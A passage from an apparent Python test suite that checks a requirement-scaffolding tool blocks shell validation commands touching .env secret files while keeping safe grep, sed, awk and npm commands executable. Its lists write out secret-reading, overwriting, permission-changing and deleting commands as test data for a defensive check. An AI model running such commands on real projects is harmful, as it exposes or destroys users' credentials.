            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_control_flow_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_control_flow_secret_read_blocked_commands,
        "blocked shell control-flow secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_control_flow_secret_read_coverage_path = unsafe_shell_control_flow_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_control_flow_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_control_flow_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_control_flow_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_control_flow_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_control_flow_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_control_flow_secret_read_coverage_proc.returncode == 0, "shell control-flow secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_control_flow_secret_read_coverage = load_json(unsafe_shell_control_flow_secret_read_coverage_path)
    unsafe_shell_control_flow_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_control_flow_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_control_flow_secret_read_blocked_commands:
        command_matches = unsafe_shell_control_flow_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_control_flow_secret_read_coverage.get("coverage_complete") is True, "shell control-flow secret read source coverage should remain complete.")

def _verify_secret_read_process_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证管道、进程替换与 find 读取边界。"""
    unsafe_shell_pipe_process_find_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_PIPE_PROCESS_FIND_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-shell-pipe-process-find-secret-read-code-pr-scaffold",
    )
    unsafe_shell_pipe_process_find_secret_read_summary = load_json(unsafe_shell_pipe_process_find_secret_read_dir / "scaffold-summary.json")
    unsafe_shell_pipe_process_find_secret_read_plan = load_json(unsafe_shell_pipe_process_find_secret_read_dir / "test-plan.json")
    unsafe_shell_pipe_process_find_secret_read_steps = [
        step
        for scenario in unsafe_shell_pipe_process_find_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_pipe_process_find_secret_read_commands = [
        step.get("command")
        for step in unsafe_shell_pipe_process_find_secret_read_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_pipe_process_find_secret_read_blocked_commands = [
        "bash -lc 'while read FILE; do cat \"$FILE\"; done < <(printf .env)'",
        "bash -lc 'mapfile -t FILES < <(printf .env); cat \"${FILES[0]}\"'",
        "bash -lc 'readarray -t FILES < <(printf .env); head \"${FILES[0]}\"'",
        "bash -lc 'printf .env | while read FILE; do cat \"$FILE\"; done'",
        "find . -name .env -exec cat {}",
    ]
    unsafe_shell_pipe_process_find_secret_read_source_commands = [
        "bash -lc 'while read FILE; do cat \"$FILE\"; done < <(printf .env)'",
        "bash -lc 'mapfile -t FILES < <(printf .env); cat \"${FILES[0]}\"'",
        "bash -lc 'readarray -t FILES < <(printf .env); head \"${FILES[0]}\"'",
        "bash -lc 'printf .env | while read FILE; do cat \"$FILE\"; done'",
        "find . -name .env -exec cat {} ;",
    ]
    unsafe_shell_pipe_process_find_secret_read_forbidden_command_parts = [
        ["bash", "-lc", 'while read FILE; do cat "$FILE"; done < <(printf .env)'],
        ["bash", "-lc", 'mapfile -t FILES < <(printf .env); cat "${FILES[0]}"'],
        ["bash", "-lc", 'readarray -t FILES < <(printf .env); head "${FILES[0]}"'],
        ["bash", "-lc", 'printf .env | while read FILE; do cat "$FILE"; done'],
        ["find", ".", "-name", ".env", "-exec", "cat", "{}"],
    ]
    assert_true(unsafe_shell_pipe_process_find_secret_read_summary.get("validation_command_count") == 1, "shell pipe/process/find secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_shell_pipe_process_find_secret_read_summary.get("blocked_validation_command_count") == 5, "shell pipe/process/find secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- pipe-process-find-secret-path"] in unsafe_shell_pipe_process_find_secret_read_commands,
        "safe shell pipe/process/find npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_shell_pipe_process_find_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_shell_pipe_process_find_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_shell_pipe_process_find_secret_read_summary.get("blocked_validation_commands") == unsafe_shell_pipe_process_find_secret_read_blocked_commands,
        "blocked shell pipe/process/find secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_shell_pipe_process_find_secret_read_coverage_path = unsafe_shell_pipe_process_find_secret_read_dir / "requirement-coverage.json"
    unsafe_shell_pipe_process_find_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_shell_pipe_process_find_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_shell_pipe_process_find_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_shell_pipe_process_find_secret_read_coverage_path),
        ],
        cwd=unsafe_shell_pipe_process_find_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_shell_pipe_process_find_secret_read_coverage_proc.returncode == 0, "shell pipe/process/find secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_shell_pipe_process_find_secret_read_coverage = load_json(unsafe_shell_pipe_process_find_secret_read_coverage_path)
    unsafe_shell_pipe_process_find_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_shell_pipe_process_find_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_shell_pipe_process_find_secret_read_source_commands:
        command_matches = unsafe_shell_pipe_process_find_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_shell_pipe_process_find_secret_read_coverage.get("coverage_complete") is True, "shell pipe/process/find secret read source coverage should remain complete.")

_SECRET_READ_SCENARIO_FAMILIES: tuple[Callable[[Path, Path], None], ...] = (
    _verify_secret_read_wrapper_safety,
    _verify_secret_read_assignment_safety,
    _verify_secret_read_indirection_safety,
    _verify_secret_read_process_safety,
)

def _verify_secret_read_safety(script_dir: Path, tmp_path: Path) -> None:
    """按安全语义边界运行子场景，并保留原有场景族入口。"""
    for family in _SECRET_READ_SCENARIO_FAMILIES:
        try:
            family(script_dir, tmp_path)
        except AssertionError as exc:
            raise AssertionError(f"{family.__name__}: {exc}") from exc


def _verify_secret_command_and_heredoc_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证 dd、只读命令与 heredoc 安全边界。"""
    unsafe_dd_secret_read_safe_grep_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_DD_SECRET_READ_SAFE_GREP_CODE_PR_REQUIREMENT,
        "unsafe-dd-secret-read-safe-grep-code-pr-scaffold",
    )
    unsafe_dd_secret_read_safe_grep_summary = load_json(unsafe_dd_secret_read_safe_grep_dir / "scaffold-summary.json")
    unsafe_dd_secret_read_safe_grep_plan = load_json(unsafe_dd_secret_read_safe_grep_dir / "test-plan.json")
    unsafe_dd_secret_read_safe_grep_steps = [
        step
        for scenario in unsafe_dd_secret_read_safe_grep_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_dd_secret_read_safe_grep_commands = [
        step.get("command")
        for step in unsafe_dd_secret_read_safe_grep_steps
        if step.get("action") == "command"
    ]
    assert_true(unsafe_dd_secret_read_safe_grep_summary.get("validation_command_count") == 2, "safe grep and npm validation commands should stay executable.")
    assert_true(unsafe_dd_secret_read_safe_grep_summary.get("blocked_validation_command_count") == 1, "dd secret read should be the only blocked validation command.")
    assert_true(
        unsafe_dd_secret_read_safe_grep_summary.get("blocked_validation_commands") == ["dd if=.env of=/tmp/env.copy"],
        "blocked dd secret read command should preserve the original source line for auditability.",
    )
    assert_true(
        ["bash", "-lc", "grep TOKEN < tmp/results"] in unsafe_dd_secret_read_safe_grep_commands,
        "safe grep against a non-secret artifact should remain executable even when the pattern text is secret-like.",
    )
    assert_true(
        ["bash", "-lc", "npm test -- heredoc-dd-safe-grep"] in unsafe_dd_secret_read_safe_grep_commands,
        "safe npm test should remain executable beside blocked dd secret read.",
    )
    assert_true(
        ["dd", "if=.env", "of=/tmp/env.copy"] not in unsafe_dd_secret_read_safe_grep_commands,
        "dd secret file read must not become an executable validation command.",
    )
    unsafe_dd_secret_read_safe_grep_coverage_path = unsafe_dd_secret_read_safe_grep_dir / "requirement-coverage.json"
    unsafe_dd_secret_read_safe_grep_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_dd_secret_read_safe_grep_dir / "requirement.md"),
            "--matrix",
            str(unsafe_dd_secret_read_safe_grep_dir / "test-matrix.json"),
            "--out",
            str(unsafe_dd_secret_read_safe_grep_coverage_path),
        ],
        cwd=unsafe_dd_secret_read_safe_grep_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_dd_secret_read_safe_grep_coverage_proc.returncode == 0, "dd secret read and safe grep source lines should remain fully covered.")
    unsafe_dd_secret_read_safe_grep_coverage = load_json(unsafe_dd_secret_read_safe_grep_coverage_path)
    unsafe_dd_secret_read_safe_grep_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_dd_secret_read_safe_grep_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    dd_matches = unsafe_dd_secret_read_safe_grep_coverage_by_text.get("dd if=.env of=/tmp/env.copy", {}).get("matches", [])
    grep_matches = unsafe_dd_secret_read_safe_grep_coverage_by_text.get("bash -lc 'grep TOKEN < tmp/results'", {}).get("matches", [])
    assert_true(any(match.get("requirement_status") == "Blocked" for match in dd_matches), "dd source line should map to a blocked requirement.")
    assert_true(any(match.get("requirement_status") == "Untested" for match in grep_matches), "safe grep source line should map to an executable untested requirement.")
    assert_true(unsafe_dd_secret_read_safe_grep_coverage.get("coverage_complete") is True, "dd/safe-grep source coverage should remain complete.")

    scaffold_spec = importlib.util.spec_from_file_location("scaffold_requirement_under_test", script_dir / "scaffold_requirement.py")
    assert_true(scaffold_spec is not None and scaffold_spec.loader is not None, "scaffold module should be importable for heredoc secret-read checks.")
    scaffold_module = importlib.util.module_from_spec(scaffold_spec)
    scaffold_spec.loader.exec_module(scaffold_module)
    heredoc_secret_commands = [
        "bash -lc 'python - <<\"PY\"\nprint(open(\".env\").read())\nPY'",
        "bash -lc 'node <<\"JS\"\nconsole.log(require(\"fs\").readFileSync(\".env\", \"utf8\"))\nJS'",
    ]
    heredoc_safe_commands = [
        "bash -lc 'python - <<\"PY\"\nprint(open(\"tmp/results.json\").read())\nPY'",
        "bash -lc 'node <<\"JS\"\nconsole.log(require(\"fs\").readFileSync(\"tmp/results.json\", \"utf8\"))\nJS'",
    ]
    for command in heredoc_secret_commands:
        assert_true(
            scaffold_module.has_secret_exposure_command(scaffold_module.split_shell_script_parts(command)) is True,
            f"{command} should be detected as a heredoc interpreter secret read.",
        )
    for command in heredoc_safe_commands:
        assert_true(
            scaffold_module.has_secret_exposure_command(scaffold_module.split_shell_script_parts(command)) is False,
            f"{command} should not be treated as a secret read when it targets a non-secret artifact.",
        )
    safe_search_command = "bash -lc 'grep TOKEN < tmp/results.json'"
    assert_true(
        scaffold_module.has_secret_exposure_command(scaffold_module.split_shell_script_parts(safe_search_command)) is False,
        "grep with a secret-like pattern should not be blocked when it reads a non-secret artifact path.",
    )

def _verify_secret_write_tool_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证 sed、awk 与秘密文件写入边界。"""
    unsafe_secret_write_safe_sed_awk_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SECRET_WRITE_SAFE_SED_AWK_CODE_PR_REQUIREMENT,
        "unsafe-secret-write-safe-sed-awk-code-pr-scaffold",
    )
    unsafe_secret_write_safe_sed_awk_summary = load_json(unsafe_secret_write_safe_sed_awk_dir / "scaffold-summary.json")
    unsafe_secret_write_safe_sed_awk_plan = load_json(unsafe_secret_write_safe_sed_awk_dir / "test-plan.json")
    unsafe_secret_write_safe_sed_awk_steps = [
        step
        for scenario in unsafe_secret_write_safe_sed_awk_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_secret_write_safe_sed_awk_commands = [
        step.get("command")
        for step in unsafe_secret_write_safe_sed_awk_steps
        if step.get("action") == "command"
    ]
    unsafe_secret_write_safe_sed_awk_blocked_commands = [
        "bash -lc 'echo TOKEN > .env'",
        "bash -lc 'printf TOKEN > ./secrets.env'",
        "bash -lc 'touch .env'",
        "bash -lc 'truncate -s 0 .env'",
        "bash -lc 'tee .env <<< TOKEN'",
    ]
    unsafe_secret_write_safe_sed_awk_forbidden_command_parts = [
        ["bash", "-lc", "echo TOKEN > .env"],
        ["bash", "-lc", "printf TOKEN > ./secrets.env"],
        ["bash", "-lc", "touch .env"],
        ["bash", "-lc", "truncate -s 0 .env"],
        ["bash", "-lc", "tee .env <<< TOKEN"],
    ]
    assert_true(unsafe_secret_write_safe_sed_awk_summary.get("validation_command_count") == 3, "safe sed, awk, and npm validation commands should stay executable.")
    assert_true(unsafe_secret_write_safe_sed_awk_summary.get("blocked_validation_command_count") == 5, "secret file write commands should be blocked validation commands.")
    assert_true(
        unsafe_secret_write_safe_sed_awk_summary.get("blocked_validation_commands") == unsafe_secret_write_safe_sed_awk_blocked_commands,
        "blocked secret file write commands should preserve the original source lines for auditability.",
    )
    assert_true(["bash", "-lc", "sed -n /TOKEN/p tmp/results"] in unsafe_secret_write_safe_sed_awk_commands, "safe sed pattern command should stay executable.")
    assert_true(["bash", "-lc", "awk /TOKEN/ tmp/results"] in unsafe_secret_write_safe_sed_awk_commands, "safe awk pattern command should stay executable.")
    assert_true(["bash", "-lc", "npm test -- secret-write-safe-sed-awk"] in unsafe_secret_write_safe_sed_awk_commands, "safe npm test should stay executable.")
    for command_parts in unsafe_secret_write_safe_sed_awk_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_secret_write_safe_sed_awk_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    unsafe_secret_write_safe_sed_awk_coverage_path = unsafe_secret_write_safe_sed_awk_dir / "requirement-coverage.json"
    unsafe_secret_write_safe_sed_awk_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_secret_write_safe_sed_awk_dir / "requirement.md"),
            "--matrix",
            str(unsafe_secret_write_safe_sed_awk_dir / "test-matrix.json"),
            "--out",
            str(unsafe_secret_write_safe_sed_awk_coverage_path),
        ],
        cwd=unsafe_secret_write_safe_sed_awk_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_secret_write_safe_sed_awk_coverage_proc.returncode == 0, "secret write and safe sed/awk source lines should remain fully covered.")
    unsafe_secret_write_safe_sed_awk_coverage = load_json(unsafe_secret_write_safe_sed_awk_coverage_path)
    unsafe_secret_write_safe_sed_awk_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_secret_write_safe_sed_awk_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_secret_write_safe_sed_awk_blocked_commands:
        command_matches = unsafe_secret_write_safe_sed_awk_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    for command in ("bash -lc 'sed -n /TOKEN/p tmp/results'", "bash -lc 'awk /TOKEN/ tmp/results'"):
        command_matches = unsafe_secret_write_safe_sed_awk_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Untested" for match in command_matches),
            f"{command} source line should map to an executable untested requirement.",
        )
    assert_true(unsafe_secret_write_safe_sed_awk_coverage.get("coverage_complete") is True, "secret write/safe sed-awk source coverage should remain complete.")

def _verify_secret_metadata_mutation_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证元数据、find 与 xargs 变更边界。"""
    unsafe_secret_metadata_mutation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SECRET_METADATA_MUTATION_CODE_PR_REQUIREMENT,
        "unsafe-secret-metadata-mutation-code-pr-scaffold",
    )
    unsafe_secret_metadata_mutation_summary = load_json(unsafe_secret_metadata_mutation_dir / "scaffold-summary.json")
    unsafe_secret_metadata_mutation_plan = load_json(unsafe_secret_metadata_mutation_dir / "test-plan.json")
    unsafe_secret_metadata_mutation_steps = [
        step
        for scenario in unsafe_secret_metadata_mutation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_secret_metadata_mutation_commands = [
        step.get("command")
        for step in unsafe_secret_metadata_mutation_steps
        if step.get("action") == "command"
    ]
    unsafe_secret_metadata_mutation_blocked_commands = [
        "bash -lc 'chmod 600 .env'",
        "bash -lc 'chown root .env'",
        "bash -lc 'mv .env /tmp/env.backup'",
        "bash -lc 'ln -s .env tmp/env-link'",
        "bash -lc 'install -m 600 /dev/null .env'",
    ]
    unsafe_secret_metadata_mutation_forbidden_command_parts = [
        ["bash", "-lc", "chmod 600 .env"],
        ["bash", "-lc", "chown root .env"],
        ["bash", "-lc", "mv .env /tmp/env.backup"],
        ["bash", "-lc", "ln -s .env tmp/env-link"],
        ["bash", "-lc", "install -m 600 /dev/null .env"],
    ]
    assert_true(unsafe_secret_metadata_mutation_summary.get("validation_command_count") == 2, "safe metadata and npm validation commands should stay executable.")
    assert_true(unsafe_secret_metadata_mutation_summary.get("blocked_validation_command_count") == 5, "secret file metadata mutation commands should be blocked validation commands.")
    assert_true(
        unsafe_secret_metadata_mutation_summary.get("blocked_validation_commands") == unsafe_secret_metadata_mutation_blocked_commands,
        "blocked secret metadata mutation commands should preserve the original source lines for auditability.",
    )
    assert_true(["bash", "-lc", "chmod 600 tmp/results"] in unsafe_secret_metadata_mutation_commands, "metadata command against a non-secret artifact should stay executable.")
    assert_true(["bash", "-lc", "npm test -- secret-metadata-safe"] in unsafe_secret_metadata_mutation_commands, "safe npm test should stay executable.")
    for command_parts in unsafe_secret_metadata_mutation_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_secret_metadata_mutation_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    unsafe_secret_metadata_mutation_coverage_path = unsafe_secret_metadata_mutation_dir / "requirement-coverage.json"
    unsafe_secret_metadata_mutation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_secret_metadata_mutation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_secret_metadata_mutation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_secret_metadata_mutation_coverage_path),
        ],
        cwd=unsafe_secret_metadata_mutation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_secret_metadata_mutation_coverage_proc.returncode == 0, "secret metadata mutation and safe metadata source lines should remain fully covered.")
    unsafe_secret_metadata_mutation_coverage = load_json(unsafe_secret_metadata_mutation_coverage_path)
    unsafe_secret_metadata_mutation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_secret_metadata_mutation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_secret_metadata_mutation_blocked_commands:
        command_matches = unsafe_secret_metadata_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    safe_metadata_matches = unsafe_secret_metadata_mutation_coverage_by_text.get("bash -lc 'chmod 600 tmp/results'", {}).get("matches", [])
    assert_true(
        any(match.get("requirement_status") == "Untested" for match in safe_metadata_matches),
        "safe metadata source line should map to an executable untested requirement.",
    )
    assert_true(unsafe_secret_metadata_mutation_coverage.get("coverage_complete") is True, "secret metadata mutation source coverage should remain complete.")

    unsafe_find_xargs_secret_mutation_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_FIND_XARGS_SECRET_MUTATION_CODE_PR_REQUIREMENT,
        "unsafe-find-xargs-secret-mutation-code-pr-scaffold",
    )
    unsafe_find_xargs_secret_mutation_summary = load_json(unsafe_find_xargs_secret_mutation_dir / "scaffold-summary.json")
    unsafe_find_xargs_secret_mutation_plan = load_json(unsafe_find_xargs_secret_mutation_dir / "test-plan.json")
    unsafe_find_xargs_secret_mutation_steps = [
        step
        for scenario in unsafe_find_xargs_secret_mutation_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_find_xargs_secret_mutation_commands = [
        step.get("command")
        for step in unsafe_find_xargs_secret_mutation_steps
        if step.get("action") == "command"
    ]
    unsafe_find_xargs_secret_mutation_blocked_commands = [
        "bash -lc 'find . -name .env -delete'",
        "bash -lc 'find . -name .env -exec rm {} ;'",
        "bash -lc 'find . -name .env -exec chmod 600 {} ;'",
        "bash -lc 'printf .env | xargs rm'",
        "bash -lc 'printf .env | xargs chmod 600'",
    ]
    unsafe_find_xargs_secret_mutation_forbidden_command_parts = [
        ["bash", "-lc", "find . -name .env -delete"],
        ["bash", "-lc", "find . -name .env -exec rm {} ;"],
        ["bash", "-lc", "find . -name .env -exec chmod 600 {} ;"],
        ["bash", "-lc", "printf .env | xargs rm"],
        ["bash", "-lc", "printf .env | xargs chmod 600"],
    ]
    assert_true(unsafe_find_xargs_secret_mutation_summary.get("validation_command_count") == 3, "safe find/xargs artifact commands and npm validation should stay executable.")
    assert_true(unsafe_find_xargs_secret_mutation_summary.get("blocked_validation_command_count") == 5, "secret find/xargs mutation commands should be blocked validation commands.")
    assert_true(
        unsafe_find_xargs_secret_mutation_summary.get("blocked_validation_commands") == unsafe_find_xargs_secret_mutation_blocked_commands,
        "blocked find/xargs secret mutation commands should preserve the original source lines for auditability.",
    )
    assert_true(["bash", "-lc", "find tmp -name results -print"] in unsafe_find_xargs_secret_mutation_commands, "safe find print command should stay executable.")
    assert_true(["bash", "-lc", "printf tmp/results | xargs chmod 600"] in unsafe_find_xargs_secret_mutation_commands, "safe xargs metadata command should stay executable.")
    assert_true(["bash", "-lc", "npm test -- find-xargs-secret-mutation"] in unsafe_find_xargs_secret_mutation_commands, "safe npm test should stay executable.")
    for command_parts in unsafe_find_xargs_secret_mutation_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_find_xargs_secret_mutation_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    unsafe_find_xargs_secret_mutation_coverage_path = unsafe_find_xargs_secret_mutation_dir / "requirement-coverage.json"
    unsafe_find_xargs_secret_mutation_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_find_xargs_secret_mutation_dir / "requirement.md"),
            "--matrix",
            str(unsafe_find_xargs_secret_mutation_dir / "test-matrix.json"),
            "--out",
            str(unsafe_find_xargs_secret_mutation_coverage_path),
        ],
        cwd=unsafe_find_xargs_secret_mutation_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_find_xargs_secret_mutation_coverage_proc.returncode == 0, "find/xargs secret mutation and safe artifact source lines should remain fully covered.")
    unsafe_find_xargs_secret_mutation_coverage = load_json(unsafe_find_xargs_secret_mutation_coverage_path)
    unsafe_find_xargs_secret_mutation_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_find_xargs_secret_mutation_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_find_xargs_secret_mutation_blocked_commands:
        command_matches = unsafe_find_xargs_secret_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    for command in ("bash -lc 'find tmp -name results -print'", "bash -lc 'printf tmp/results | xargs chmod 600'"):
        command_matches = unsafe_find_xargs_secret_mutation_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Untested" for match in command_matches),
            f"{command} source line should map to an executable untested requirement.",
        )
    assert_true(unsafe_find_xargs_secret_mutation_coverage.get("coverage_complete") is True, "find/xargs secret mutation source coverage should remain complete.")

def _verify_secret_interpreter_read_safety(script_dir: Path, tmp_path: Path) -> None:
    """验证内联与 shell 包装解释器的读取边界。"""
    unsafe_inline_interpreter_secret_read_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_INLINE_INTERPRETER_SECRET_READ_CODE_PR_REQUIREMENT,
        "unsafe-inline-interpreter-secret-read-code-pr-scaffold",
    )
    unsafe_inline_interpreter_secret_read_summary = load_json(unsafe_inline_interpreter_secret_read_dir / "scaffold-summary.json")
    unsafe_inline_interpreter_secret_read_plan = load_json(unsafe_inline_interpreter_secret_read_dir / "test-plan.json")
    unsafe_inline_interpreter_secret_read_steps = [
        step
        for scenario in unsafe_inline_interpreter_secret_read_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_inline_interpreter_secret_read_commands = [step.get("command") for step in unsafe_inline_interpreter_secret_read_steps if step.get("action") == "command"]
    unsafe_inline_interpreter_secret_read_blocked_commands = [
        "python -c 'print(open(\".env\").read())'",
        "python -c 'from pathlib import Path; print(Path(\".env\").read_text())'",
        "node -e 'console.log(require(\"fs\").readFileSync(\".env\",\"utf8\"))'",
        "ruby -e 'puts File.read(\".env\")'",
    ]
    unsafe_inline_interpreter_secret_read_forbidden_command_parts = [
        ["python", "-c", 'print(open(".env").read())'],
        ["python", "-c", 'from pathlib import Path; print(Path(".env").read_text())'],
        ["node", "-e", 'console.log(require("fs").readFileSync(".env","utf8"))'],
        ["ruby", "-e", 'puts File.read(".env")'],
    ]
    assert_true(unsafe_inline_interpreter_secret_read_summary.get("validation_command_count") == 1, "inline interpreter secret read validation should preserve only non-secret test commands.")
    assert_true(unsafe_inline_interpreter_secret_read_summary.get("blocked_validation_command_count") == 4, "inline interpreter secret reads should be blocked validation commands.")
    assert_true(
        ["bash", "-lc", "npm test -- interpreter-secret-read"] in unsafe_inline_interpreter_secret_read_commands,
        "safe inline-interpreter npm test command should remain executable beside blocked secret reads.",
    )
    for command_parts in unsafe_inline_interpreter_secret_read_forbidden_command_parts:
        assert_true(
            command_parts not in unsafe_inline_interpreter_secret_read_commands,
            f"{command_parts} must not become an executable validation command.",
        )
    assert_true(
        unsafe_inline_interpreter_secret_read_summary.get("blocked_validation_commands") == unsafe_inline_interpreter_secret_read_blocked_commands,
        "blocked inline interpreter secret read commands should preserve the original source lines for auditability.",
    )
    unsafe_inline_interpreter_secret_read_coverage_path = unsafe_inline_interpreter_secret_read_dir / "requirement-coverage.json"
    unsafe_inline_interpreter_secret_read_coverage_proc = subprocess.run(
        [
            sys.executable,
            str(script_dir / "audit_requirement_coverage.py"),
            "--requirement",
            str(unsafe_inline_interpreter_secret_read_dir / "requirement.md"),
            "--matrix",
            str(unsafe_inline_interpreter_secret_read_dir / "test-matrix.json"),
            "--out",
            str(unsafe_inline_interpreter_secret_read_coverage_path),
        ],
        cwd=unsafe_inline_interpreter_secret_read_dir,
        text=True,
        capture_output=True,
    )
    assert_true(unsafe_inline_interpreter_secret_read_coverage_proc.returncode == 0, "inline interpreter secret read source lines should map as blocked code_pr coverage instead of executable commands.")
    unsafe_inline_interpreter_secret_read_coverage = load_json(unsafe_inline_interpreter_secret_read_coverage_path)
    unsafe_inline_interpreter_secret_read_coverage_by_text = {
        item.get("text"): item
        for item in unsafe_inline_interpreter_secret_read_coverage.get("coverage", [])
        if isinstance(item, dict)
    }
    for command in unsafe_inline_interpreter_secret_read_blocked_commands:
        command_matches = unsafe_inline_interpreter_secret_read_coverage_by_text.get(command, {}).get("matches", [])
        assert_true(
            any(match.get("requirement_status") == "Blocked" for match in command_matches),
            f"{command} source line should map to a blocked requirement.",
        )
    assert_true(unsafe_inline_interpreter_secret_read_coverage.get("coverage_complete") is True, "inline interpreter secret read source coverage should remain complete.")

    unsafe_shell_wrapped_interpreter_secret_access_dir = _write_and_run_scaffold(script_dir, tmp_path,
        UNSAFE_SHELL_WRAPPED_INTERPRETER_SECRET_ACCESS_CODE_PR_REQUIREMENT,
        "unsafe-shell-wrapped-interpreter-secret-access-code-pr-scaffold",
    )
    unsafe_shell_wrapped_interpreter_secret_access_summary = load_json(unsafe_shell_wrapped_interpreter_secret_access_dir / "scaffold-summary.json")
    unsafe_shell_wrapped_interpreter_secret_access_plan = load_json(unsafe_shell_wrapped_interpreter_secret_access_dir / "test-plan.json")
    unsafe_shell_wrapped_interpreter_secret_access_steps = [
        step
        for scenario in unsafe_shell_wrapped_interpreter_secret_access_plan.get("scenarios", [])
        for step in scenario.get("steps", [])
        if isinstance(step, dict)
    ]
    unsafe_shell_wrapped_interpreter_secret_access_commands = [
        step.get("command")
        for step in unsafe_shell_wrapped_interpreter_secret_access_steps
        if step.get("action") == "command"
    ]
    unsafe_shell_wrapped_interpreter_secret_access_blocked_commands = [
        "bash -lc 'perl -pi -e s/TOKEN/REDACTED/ .env'",
        "bash -lc 'perl -ne print .env'",
        "bash -lc 'python -c \"from pathlib import Path; Path(\\\".env\\\").write_text(\\\"x\\\")\"'",
        "bash -lc 'node -e \"require(\\\"fs\\\").writeFileSync(\\\".env\\\",\\\"x\\\")\"'",
    ]
